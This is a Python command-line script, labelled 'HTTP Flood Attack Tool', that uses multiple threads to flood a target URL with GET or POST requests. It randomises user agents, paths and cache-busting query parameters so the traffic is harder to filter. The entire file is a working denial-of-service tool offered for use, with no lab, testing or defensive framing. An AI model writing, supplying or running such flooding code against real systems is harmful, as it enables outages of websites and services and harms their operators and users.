#!/usr/bin/env python3
import argparse
import random
import threading
import time
import requests
from fake_useragent import UserAgent

# List of common paths to request during an attack
PATHS = ['/', '/index.html', '/about', '/contact', '/products', '/services']

def http_flood(target_url, num_requests=1000, method='GET'):
    """Send HTTP requests to target to perform an HTTP flood attack"""
    print(f"Starting HTTP flood attack on {target_url}")
    
    # Get a random user agent generator
    try:
        ua = UserAgent()
    except:
        # Fallback user agent if the library fails
        ua = None
    
    total_sent = 0
    success = 0
    failed = 0
    
    for _ in range(num_requests):
        # Select random path from list
        if '://' in target_url:
            path = random.choice(PATHS)
            url = target_url + path
        else:
            url = target_url
        
        # Set random user agent
        headers = {}
        if ua:
            headers['User-Agent'] = ua.random
        
        try:
            if method.upper() == 'GET':
                # Add a random query parameter to bypass cache
                query = f"?nocache={random.randint(1000000, 9999999)}"
                response = requests.get(url + query, headers=headers, timeout=2)
            else:  # POST
                # Create random form data
                data = {f'field{i}': f'value{random.randint(1, 1000)}' for i in range(5)}
                response = requests.post(url, headers=headers, data=data, timeout=2)
                
            total_sent += 1
            
            if response.status_code < 400:
                success += 1
            else:
                failed += 1
                
        except requests.exceptions.RequestException:
            total_sent += 1
            failed += 1
        
        if total_sent % 50 == 0:
            print(f"Sent {total_sent} requests: {success} successful, {failed} failed")
            
    print(f"Attack complete. Sent {total_sent} requests: {success} successful, {failed} failed")

def main():
    parser = argparse.ArgumentParser(description='HTTP Flood Attack Tool')
    parser.add_argument('target_url', help='Target URL (http://example.com)')
    parser.add_argument('-c', '--count', type=int, default=1000, 
                        help='Number of requests to send (default: 1000)')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET',
                        help='HTTP method (GET or POST, default: GET)')
    parser.add_argument('-t', '--threads', type=int, default=5, 
                        help='Number of threads (default: 5)')
    
    args = parser.parse_args()
    
    threads = []
    requests_per_thread = args.count // args.threads
    
    # Create and start threads
    for i in range(args.threads):
        thread = threading.Thread(
            target=http_flood,
            args=(args.target_url, requests_per_thread, args.method)
        )
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
        
    print("Attack completed")

if __name__ == "__main__":
    main()